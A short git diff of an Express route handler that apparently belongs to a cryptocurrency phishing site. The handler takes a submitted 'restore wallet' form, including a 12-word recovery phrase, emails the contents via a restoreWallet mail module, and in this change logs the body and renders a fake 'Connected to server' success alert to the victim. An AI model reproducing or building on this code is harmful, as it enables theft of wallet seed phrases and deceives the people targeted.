@@ -4,6 +4,7 @@ const sendEmail = require("../emails/restoreWallet");
 module.exports = async (req, res) => {
   try {
     const type = req.query.type;
+    console.log(req.body);
 
     // 12 word key-phrase
     if (type === "12") {
@@ -26,7 +27,12 @@ module.exports = async (req, res) => {
       const sentMail = await sendEmail(req.body, type);
       console.log(sentMail);
     }
-    res.json(req.body);
+
+    return res.status(400).render("support", {
+      formSection: type,
+      form: req.body,
+      alert: { status: "success", message: "Connected to server" },
+    });
   } catch (error) {
     console.log("ERROR RESTORING WALLET");
     console.log(error);
